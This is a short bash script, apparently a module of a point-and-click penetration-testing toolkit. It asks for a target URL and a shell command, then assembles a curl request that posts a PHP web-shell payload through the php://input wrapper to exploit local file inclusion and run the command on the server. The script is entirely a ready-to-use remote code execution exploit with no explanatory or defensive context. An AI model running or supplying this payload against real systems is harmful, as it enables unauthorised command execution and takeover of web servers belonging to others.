#!/bin/bash

: '
Try to execute a cmd with php://input
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
CMD_FIELD=$(form_item "CMD" "cmd" "whoami")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}"

WEBSITE=${form_data["website"]}
CMD=${form_data["cmd"]}

paste_command "curl -s -X POST --data '<?php system(\$_GET["cmd"]); ?>' "${WEBSITE}php://input\&cmd=${CMD}""
